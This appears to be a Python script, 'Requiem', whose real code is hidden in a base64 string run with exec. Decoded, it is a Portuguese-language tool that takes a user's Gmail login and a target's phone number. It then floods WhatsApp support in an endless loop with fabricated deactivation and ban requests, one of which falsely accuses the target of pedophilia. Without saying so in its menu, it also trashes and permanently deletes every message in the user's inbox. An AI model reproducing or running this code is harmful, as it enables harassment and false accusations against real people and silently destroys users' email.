import marshal, zlib, os, sys
# sla se base64 vem pré-instalada, lmfao
# Script Name: Requiem
# https://docs.python.org/3.5/library/smtplib.html 
# http://stackoverflow.com/a/27515833/2684304
try:
	import base64
except:
	os.system("pip install base64")
	import base64
a = (base64.b64decode('''IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMgLS0gY29kaW5nOiB1dGYtOCAtLQpnbG9iYWwgUixCLEMsWSxHLFJULENZLENPCkNPPSdcMDMzW20nO1I9J1wwMzNbMTszMW0nO0I9J1wwMzNbMTszNG0nO0M9J1wwMzNbMTszN20nO0NZPSdcMDMzWzE7MzZtJztZPSdcMDMzWzE7MzNtJztHPSdcMDMzWzE7MzJtJztSVD0nXDAzM1s7MG0nO05PX0ZPUk1BVD0iXDAzM1swbSI7Q19HUkVZODk9IlwwMzNbMzg7NTsyNTRtIjtDX1JFRDE9IlwwMzNbNDg7NTsxOTZtIgppbXBvcnQgc210cGxpYiwgb3MsIHN5cywgdGltZSwgc3NsCmRlZiBsaW5rKCk6Cglvcy5zeXN0ZW0oInRlcm11eC1vcGVuLXVybCBodHRwczovL215YWNjb3VudC5nb29nbGUuY29tL2xlc3NzZWN1cmVhcHBzP3BsaT0xJnJhcHQ9QUVqSEw0T1NnZ2pZT2d0OGc4SGJnU1U1OExwVXFRNUdzRDYzaXBFTnFhODRZZWdNSGlvbnFxdklYTU1vYzRicXUtQzBHSDBOLS1LYWxfQUZwZDVyUkpZeU8wZy15MUFiRVEiKQoKZGVmIHJlc3RhcnQoKToKICAgIHB5dGhvbiA9IHN5cy5leGVjdXRhYmxlO29zLmV4ZWNsKHB5dGhvbiwgcHl0aG9uLCAqc3lzLmFyZ3YpCgpkZWYgY2xlYXIoKToKCW9zLnN5c3RlbSgiY2xlYXIiKQoKY2xlYXIoKQp0cnk6CglpbXBvcnQgcHlmaWdsZXQKZXhjZXB0OgoJb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCBweWZpZ2xldCIpO3Jlc3RhcnQoKQoKcmVzdWx0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiUiBlIHEgdSBpIGUgbSIsIGZvbnQgPSAiY29zbWljIiApCnByaW50KGYnJyd7Q317R317cmVzdWx0fXtDfScnJykKcCA9IGlucHV0KGYne0N9W3tHfSF7Q31dIERpZ2l0ZSBhIFNlbmhhOiAnKQppZiBwID09ICdFbmRyZXdGdWNrTWFtYTEyMyc6CiAgICBwcmludChmJ3tDfVt7R30qe0N9XSBBY2Vzc28gTGliZXJhZG8nKTt0aW1lLnNsZWVwKDIpO3Bhc3MKZWxzZToKICAgIHByaW50KGYne0N9W3tSfSp7Q31dIFNlbmhhIEluY29ycmV0YScpO3RpbWUuc2xlZXAoMik7cmVzdGFydCgpCgpibG9ja19udW0gPSBbIis1NSAyMSA3OTE4LTA1MzMiLCIrNTUgMjEgNzkxODA1MzMiLCI1NSAyMSA3OTE4MDUzMzMzIiwiNTUgMjEgNzkxOC0wNTMzIiwiKzU1MjE3OTE4LTA1MzMiLCIrNTUyMTc5MTgwNTMzIiwiNTUyMTc5MTgwNTMzIiwiNTUyMTc5MTgtMDUzMyJdCgpkZWYgaW5pdCgpOgoJCWZvciBudW0gaW4gYmxvY2tfbnVtOgoJCQlpZiBudW0gaW4gbnVtZXJvOgoJCQkJcHJpbnQoZidcbntDfVt7Un0he0N9XSBOw5pNRVJPIFBST0lCSURPLicpO3RpbWUuc2xlZXAoMyk7cmVzdGFydCgpCgkJaW1wb3J0IGVtYWlsLm1lc3NhZ2UKCQlpbXBvcnQgaW1hcGxpYgoJCWltcG9ydCBlbWFpbAoJCXRyeToKCQkJaW1hcGxpYi5fTUFYTElORSA9IDEwMDAwMDAKCQkJRU1BSUwgPSAne30nLmZvcm1hdChnbWFpbCkKCQkJUEFTU1dPUkQgPSAne30nLmZvcm1hdChzZW5oYSkKCQkJU0VSVkVSID0gJ2ltYXAuZ21haWwuY29tJwoJCQltYWlsID0gaW1hcGxpYi5JTUFQNF9TU0woU0VSVkVSKQoJCQltYWlsLmxvZ2luKEVNQUlMLCBQQVNTV09SRCkKCQkJbWFpbC5zZWxlY3QoJ0lOQk9YJykKCQkJc3RhdHVzLCBzZWFyY2hfZGF0YSA9IG1haWwuc2VhcmNoKE5vbmUsICdBTEwnKQoJCQltYWlsX2lkcyA9IFtdCgkJCWZvciBibG9jayBpbiBzZWFyY2hfZGF0YToKCQkJCW1haWxfaWRzICs9IGJsb2NrLnNwbGl0KCkKCQkJc3RhcnQgPSBtYWlsX2lkc1swXS5kZWNvZGUoKQoJCQllbmQgPSBtYWlsX2lkc1stMV0uZGVjb2RlKCkKCQkJbWFpbC5zdG9yZShmJ3tzdGFydH06e2VuZH0nLmVuY29kZSgpLCAnK1gtR00tTEFCRUxTJywgJ1xcVHJhc2gnKQoJCQltYWlsLnNlbGVjdCgnW0dtYWlsXS9UcmFzaCcpCgkJCW1haWwuc3RvcmUoIjE6KiIsICcrRkxBR1MnLCAnXFxEZWxldGVkJykKCQkJbWFpbC5leHB1bmdlKCkKCQkJbWFpbC5jbG9zZSgpCgkJCW1haWwubG9nb3V0KCkKCQkJcHJpbnQoZiJ7Q31be0d9IXtDfV0gTGltcGV6YSBDb25jbHXDrWRhISIpCgkJZXhjZXB0OgoJCQlwcmludChmJ3tDfVt7Un0he0N9XSBMaW1wZXphIGRlIEluYm94IG7Do28gY29uY2x1w61kYS4nKTt0aW1lLnNsZWVwKDEpCgkJbXNnID0gZW1haWwubWVzc2FnZS5NZXNzYWdlKCkKCQltc2dbJ1N1YmplY3QnXSA9ICd7fScuZm9ybWF0KHRpdHVsbykKCQltc2dbJ0Zyb20nXSA9ICd7fScuZm9ybWF0KGdtYWlsKQoJCW1zZ1snVG8nXSA9ICdzdXBwb3J0QHN1cHBvcnQud2hhdHNhcHAuY29tJwoJCXBhc3N3b3JkID0gJ3t9Jy5mb3JtYXQoc2VuaGEpCgkJbXNnLmFkZF9oZWFkZXIoJ0NvbnRlbnQtVHlwZScsICd0ZXh0L2h0bWwnKQoJCW1zZy5zZXRfcGF5bG9hZChiZCApCgkJdHJ5OgoJCQl3aGlsZSBUcnVlOgoJCQkJcyA9IHNtdHBsaWIuU01UUCgnc210cC5nbWFpbC5jb206IDU4NycpCgkJCQlzLnN0YXJ0dGxzKCkKCQkJCXMubG9naW4obXNnWydGcm9tJ10sIHBhc3N3b3JkKQoJCQkJcy5zZW5kbWFpbChtc2dbJ0Zyb20nXSwgW21zZ1snVG8nXV0sIG1zZy5hc19zdHJpbmcoKS5lbmNvZGUoJ3V0Zi04JykpCgkJCQlpbXBvcnQgaW1hcGxpYgoJCQkJaW1wb3J0IGVtYWlsCgkJCQlmcm9tIGVtYWlsLmhlYWRlciBpbXBvcnQgZGVjb2RlX2hlYWRlcgoJCQkJaW1wb3J0IHdlYmJyb3dzZXIKCQkJCWltcG9ydCBvcwoJCQkJaW1wb3J0IHRyYWNlYmFjawoJCQkJRlJPTV9FTUFJTCA9ICJ7fSIuZm9ybWF0KGdtYWlsKQoJCQkJRlJPTV9QV0QgPSAie30iLmZvcm1hdChzZW5oYSkKCQkJCVNNVFBfU0VSVkVSID0gImltYXAuZ21haWwuY29tIiAKCQkJCVNNVFBfUE9SVCA9IDk5MwoJCQkJdHJ5OgoJCQkJCW1haWwgPSBpbWFwbGliLklNQVA0X1NTTChTTVRQX1NFUlZFUikKCQkJCQltYWlsLmxvZ2luKEZST01fRU1BSUwsRlJPTV9QV0QpCgkJCQkJbWFpbC5zZWxlY3QoJ2luYm94JykKCQkJCQlkYXRhID0gbWFpbC5zZWFyY2goTm9uZSwgJ0FMTCcpCgkJCQkJbWFpbF9pZHMgPSBkYXRhWzFdCgkJCQkJaWRfbGlzdCA9IG1haWxfaWRzWzBdLnNwbGl0KCkKCQkJCQlmaXJzdF9lbWFpbF9pZCA9IGludChpZF9saXN0WzBdKQoJCQkJCWxhdGVzdF9lbWFpbF9pZCA9IGludChpZF9saXN0Wy0xXSkKCQkJCQlmb3IgaSBpbiByYW5nZShsYXRlc3RfZW1haWxfaWQsZmlyc3RfZW1haWxfaWQsIC0xKToKCQkJCQkgICAgICAgZGF0YSA9IG1haWwuZmV0Y2goc3RyKGkpLCAnKFJGQzgyMiknICkKCQkJCQkgICAgICAgZm9yIHJlc3BvbnNlX3BhcnQgaW4gZGF0YToKCQkJCQkgICAgICAgICAgIGFyciA9IHJlc3BvbnNlX3BhcnRbMF0KCQkJCQkgICAgICAgICAgIGlmIGlzaW5zdGFuY2UoYXJyLCB0dXBsZSk6CgkJCQkJICAgICAgICAgICAgICAgbXNnID0gZW1haWwubWVzc2FnZV9mcm9tX3N0cmluZyhzdHIoYXJyWzFdLCd1dGYtOCcpKQoJCQkJCSAgICAgICAgICAgICAgIGVtYWlsX3N1YmplY3QgPSBtc2dbJ3N1YmplY3QnXQoJCQkJCSAgICAgICAgICAgICAgIGVtYWlsX2Zyb20gPSBtc2dbJ2Zyb20nXQoJCQkJCSAgICAgICAgICAgICAgIGlmICdzdXBwb3J0QHN1cHBvcnQud2hhdHNhcHAuY29tJyBpbiBtc2dbJ2Zyb20nXToKCQkJCQkgICAgICAgICAgICAgICAJcHJpbnQoZiJ7Q31be0d9IXtDfV0gTyBuw7ptZXJvIGZvaSBlbnZpYWRvIHBybyBzdXBvcnRlIGRvIFdoYXRzQXBwISBBZ3VhcmRlIGF0w6kgZWxlcyBhbmFsaXNhcmVtLi4uIik7dGltZS5zbGVlcCg1KTtwYXNzCgkJCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6CgkJCQkJcHJpbnQoZiJ7Q31be1l9IXtDfV0gQWd1YXJkZS4uLiIpCgkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlcnJvcjoKCQkJcHJpbnQoZicnJ3tDfVt7Un1FUlJPUntDfV0gUGVybWlzc2FvIG7Do28gZ2FyYW50aWRhIG91IHNlbmhhIGUgZW1haWwgaW52w6FsaWRvKHMpLlxuXG57Q31be1J9IXtDfV06JycnICsgZXJyb3IpO3RpbWUuc2xlZXAoNSk7cGFzcwoJCQkKU2FpciA9IFRydWUKd2hpbGUoU2FpciA9PSBUcnVlKToKCWNsZWFyKCk7cHJpbnQoZicnJ3tDfXtHfQp7cmVzdWx0fQouLi5gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLitzcysvL29zczpgCiAgICAgICAgICAgICAgICAgICAgICAgICBgOm95Ky0gICAgICAgYDpzcysuCiAgICAgICAgICAgICAgICAgICAgICBgL3NzL2AgICAgICAgICAgICAgIC1veW8tCiAgICAgICAgICAgICAgICAgICAtK3lvOiAgICAgICAgICAgICAgICAgICAgIGAveXMvYAogICAgICAgICAgICAgICBgOnN5Ky4gICAgICAgICAgICAgICAgICAgICAgICAgICBgOnN5Ky4KICAgICAgICAgICAgYC9zcy9gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0reW8rCiAgICAgICAgICAgLWgvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAueXNgCiAgICAgICAgICBgbS0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLStzc2RvCiAgICAgICAgICAtZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOnNkTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBgL3ltTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuK2hOTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAtb2ROTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICA6c2ROTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgK21OTk5OTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBzTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OTk55YHl5Tk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OTmgtLjpzTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OaGArTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICAtZCAgICAgICAgICAgICAgICAgICAgICBoTk5OeSAgYC4vbU5OTk5OTk5OTk5OTk5kCiAgICAgICAgICBgbS4gICAgICAgICAgICAgICAgICAgICBoTk5OTmR5eS0gZE5OTk5OaG1OTk5OTk5zCiAgICAgICAgICAgOmQ6ICAgICAgICAgICAgICAgICAgICBoTk5OTk5taC4vTk5teS8tK21OTk5OTnlgCiAgICAgICAgICAgIGAreXM6YCAgICAgICAgICAgICAgICBoTk5OaGBgIHlOTk5vb2ROTk5OTm15OgogICAgICAgICAgICAgICBgL3l5Ly4gICAgICAgICAgICAgaE5OTk5taC9tTk5OTk5OTk5kby0KICAgICAgICAgICAgICAgICAgYDpzeW8tICAgICAgICAgIGhOTk5OTk5OTk5OTk5OaCsuCiAgICAgICAgICAgICAgICAgICAgICAuK3lzOmAgICAgICBoTk5OTk5OTk5ObXMvYAogICAgICAgICAgICAgICAgICAgICAgICAgYC9zeSsuICAgeU5OTk5OTmRvLQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1veW8vK21ObXkvLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGAtOjo6CntDfVxue0N9e0d9Q29kZWQgQnk6e0N9IEtpbnlcbntDfVt7Un0qe0N9XSBBdGl2ZSBhIHBlcm1pc3PDo28gZGUgYmFpeGEgc2VndXJhbsOnYSBlIHV0aWxpemUgdW0gZW1haWwgcG9yIGF0YXF1ZShyZWNvbWVuZGHDp8OjbykuJycnKTtsaW5rKCk7b3AgPSBpbnB1dChmIlxue0N9e1l9TydxdWUgZGVzZWphIGZhemVyP3tDfVxue0N9W3tHfTF7Q31dIERlc2F0aXZhciBOdW1lcm9cbntDfVt7R30ye0N9XSBSZXRpcmFyIGRvIENvbnRhZG9yXG57Q31be0d9M3tDfV0gUmV0aXJhciBCYW5pbWVudG9cbntDfVt7R300e0N9XSBCYW5pciBOdW1lcm97Q31cbntDfVt7R301e0N9XSBEZXJydWJhciBCbGluZGFnZW1cbntDfVt7Un0we0N9XSBTYWlyXG57Q31be0d9RGlnaXRlIGEgb3DDp8Ojb3tDfV06ICIpCglpZiBvcCA9PSAnMSc6CgkJZ21haWwgPSBpbnB1dChmJ3tDfVt7WX1HbWFpbHtDfV06ICcpO3NlbmhhID0gaW5wdXQoZid7Q31be1l9U2VuaGEgKE7Do28gc2UgcHJlb2N1cGUsIG7Do28gdGVtb3MgYWNlc3NvIMOgIHN1YSBzZW5oYSl7Q31dOiAnKTtudW1lcm8gPSBpbnB1dChmJ3tDfVt7WX1OdW1lcm8gZG8gQWx2byAoZXg6IDU1IDIxIDkqKioqKXtDfV06ICcpCgkJdGl0dWxvID0gJ0Rlc2F0aXZlIGVzdGUgbsO6bWVybycKCQliZCA9ICIiIgoJCURlc2F0aXZlIGVzdGEgY29udGEgdXJnZW50ZW1lbnRlOiB7fSIiIi5mb3JtYXQobnVtZXJvKQoJCXByaW50KGYne0N9e1J9RGVzYXRpdmFuZG8gTsO6bWVybyF7Q31cblVzZSB7Q317Un1DVFJMIEN7Q30gcGFyYSBwYXJhciBvIHNjcmlwdCBlIHtDfXtHfXB5dGhvbjMgbWFpbi5weXtDfSBwYXJhIHJlaW5pY2lhci4nKTtpbml0KCkKCgllbGlmIG9wID09ICcyJzoKCQlnbWFpbCA9IGlucHV0KGYne0N9W3tZfUdtYWlse0N9XTogJyk7c2VuaGEgPSBpbnB1dChmJ3tDfVt7WX1TZW5oYSAoTsOjbyBzZSBwcmVvY3VwZSwgbsOjbyB0ZW1vcyBhY2Vzc28gw6Agc3VhIHNlbmhhKXtDfV06ICcpO251bWVybyA9IGlucHV0KGYne0N9W3tZfU51bWVybyBkbyBBbHZvIChleDogNTUgMjEgOSoqKiope0N9XTogJykKCQl0aXR1bG8gPSAnUmVlbnZpYXIgY29kaWdvIGRlIHZlcmlmaWNhw6fDo28nCgkJYmQgPSAiIiIKCQlPbMOhLCBuw6NvIGNvbnNpZ28gbWUgcmVnaXN0cmFyIG5hIG1pbmhhIGNvbnRhLCBtZSBhanVkZW06IHt9IiIiLmZvcm1hdChudW1lcm8pCgkJcHJpbnQoZid7Q317R31UaXJhbmRvIGRvIENvbnRhZG9yIXtDfVxuVXNlIHtDfXtSfUNUUkwgQ3tDfSBwYXJhIHBhcmFyIG8gc2NyaXB0IGUge0N9e0d9cHl0aG9uMyBtYWluLnB5e0N9IHBhcmEgcmVpbmljaWFyLicpO2luaXQoKQoKCWVsaWYgb3AgPT0gJzMnOgoJCWdtYWlsID0gaW5wdXQoZid7Q31be1l9R21haWx7Q31dOiAnKTtzZW5oYSA9IGlucHV0KGYne0N9W3tZfVNlbmhhIChOw6NvIHNlIHByZW9jdXBlLCBuw6NvIHRlbW9zIGFjZXNzbyDDoCBzdWEgc2VuaGEpe0N9XTogJyk7bnVtZXJvID0gaW5wdXQoZid7Q31be1l9TnVtZXJvIGRvIEFsdm8gKGV4OiA1NSAyMSA5KioqKil7Q31dOiAnKQoJCXRpdHVsbyA9ICdOYW8gY29uc2lnbyBhY2Vzc2FyIG1pbmhhIGNvbnRhJwoJCWJkID0gIiIiCgkJT2zDoSwgZXUgY29tcHJlaSB1bSBudW1lcm8gcGFyYSBtZXUgZmlsaG8gZmF6ZXIgb3MgdHJhYmFsaG9zIGRhIGVzY29sYSBuYSBxdWFsIGVsZSBlc3R1ZGEsIHBvcsOpbSBxdWFuZG8gZnVpIHRlbnRhciBlbnRyYXIgbm8gbsO6bWVybywgZXN0YXZhIGRpemVuZG8gcXVlIG8gbsO6bWVybyBmb2kgYmFuaWRvIGUgZXUgbmVtIHNlcXVlciBlbnRyZWkgbm8gbsO6bWVybywgbsOjbyBmaXogbmFkYSwgZXUgasOhIGNvbXByZWkgbyBuw7ptZXJvIGUgZWxlIGrDoSBlc3RhdmEgYXNzaW0sIGVsZSBwcmVjaXNhIHVyZ2VudGVtZW50ZSBkZXNzZSBuw7ptZXJvIHBhcmEgZmF6ZXIgb3MgdHJhYmFsaG9zIGRhIGVzY29sYS4gVmVyaWZpcXVlbSBvIG1haXMgcsOhcGlkbyBwb3Nzw612ZWwhIE7Dum1lcm86IHt9IiIiLmZvcm1hdChudW1lcm8pCgkJcHJpbnQoZid7Q317R31SZXRpcmFuZG8gQmFuaW1lbnRvIXtDfVxuVXNlIHtDfXtSfUNUUkwgQ3tDfSBwYXJhIHBhcmFyIG8gc2NyaXB0IGUge0N9e0d9cHl0aG9uMyBtYWluLnB5e0N9IHBhcmEgcmVpbmljaWFyLicpO2luaXQoKQoKCWVsaWYgb3AgPT0gJzQnOgoJCWdtYWlsID0gaW5wdXQoZid7Q31be1l9R21haWx7Q31dOiAnKTtzZW5oYSA9IGlucHV0KGYne0N9W3tZfVNlbmhhIChOw6NvIHNlIHByZW9jdXBlLCBuw6NvIHRlbW9zIGFjZXNzbyDDoCBzdWEgc2VuaGEpe0N9XTogJyk7bnVtZXJvID0gaW5wdXQoZid7Q31be1l9TnVtZXJvIGRvIEFsdm8gKGV4OiA1NSAyMSA5KioqKil7Q31dOiAnKQoJCXRpdHVsbyA9ICdNRSBBSlVERU0gVVJHRU5URU1FTlRFJwoJCWJkID0gIiIiCgkJUGVkb2ZpbGlhIGUgYWJ1c28gc2V4dWFsLCBxdWVybyBxdWUgcmVhbGl6ZW0gbyBiYW5pbWVudG8gZGVzdGUgbsO6bWVybyBhbyBTdXBvcnRlIGRvIFdoYXRzQXBwLCBlbGUgZXN0YSBlbnZvbHZpZG8gY29tIGdydXBvcyBkZSBwZWRvZmlsw61hLCBwZcOnbyBxdWUgbWUgYWp1ZGVtIG5pc3RvIHBvaXMgbWV1IGZpbGhvIGZvaSB2w610aW1hLiBOw7ptZXJvOiB7fSIiIi5mb3JtYXQobnVtZXJvKQoJCXByaW50KGYne0N9e1J9QmFuaW5kbyF7Q31cblVzZSB7Q317Un1DVFJMIEN7Q30gcGFyYSBwYXJhciBvIHNjcmlwdCBlIHtDfXtHfXB5dGhvbjMgbWFpbi5weXtDfSBwYXJhIHJlaW5pY2lhci4nKTtpbml0KCkKCQkKCWVsaWYgb3AgPT0gJzUnOgoJCWdtYWlsID0gaW5wdXQoZid7Q31be1l9R21haWx7Q31dOiAnKTtzZW5oYSA9IGlucHV0KGYne0N9W3tZfVNlbmhhIChOw6NvIHNlIHByZW9jdXBlLCBuw6NvIHRlbW9zIGFjZXNzbyDDoCBzdWEgc2VuaGEpe0N9XTogJyk7bnVtZXJvID0gaW5wdXQoZid7Q31be1l9TnVtZXJvIGRvIEFsdm8gKGV4OiA1NSAyMSA5KioqKil7Q31dOiAnKQoJCXRpdHVsbyA9ICdQZXJkaWRvL1JvdWJhZG8nCgkJYmQgPSAiIiIKCQlPbMOhLCBwZXJkaSB0b2RvcyBvcyBtZXVzIGRvY3VtZW50b3MgZSBvIG1ldSBjaGlwIGZvaSByb3ViYWRvLiBRdWVybyBxdWUgZGVzYXRpdmVtCm1pbmhhIGNvbnRhIGltZWRpYXRhbWVudGUsIG5vIGNoaXAgdGVtIGRhZG9zIHNvYnJlIG1pbSBwb3IgaXNzbywgcXVlcm8gcXVlIGRlc2F0aXZlbSBtZXUgbsO6bWVybyBpbWVkaWF0YW1lbnRlOiB7fSIiIi5mb3JtYXQobnVtZXJvKQoJCXByaW50KGYne0N9e1J9RGVycnViYW5kbyBCbGluZGFnZW0he0N9XG5Vc2Uge0N9e1J9Q1RSTCBDe0N9IHBhcmEgcGFyYXIgbyBzY3JpcHQgZSB7Q317R31weXRob24zIG1haW4ucHl7Q30gcGFyYSByZWluaWNpYXIuJyk7aW5pdCgpCgoJZWxpZiBvcCA9PSAnMCc6CgkJU2FpciA9IEZhbHNlCm9zLnN5c3RlbSgncm0gLXJmIF9fcHljYWNoZV9fJykKcHJpbnQoZidbe0N9e1J9K3tDfV0gW3tDfXtSfUFycml2ZWRlcmNpe0N9XScp'''))
exec(a)
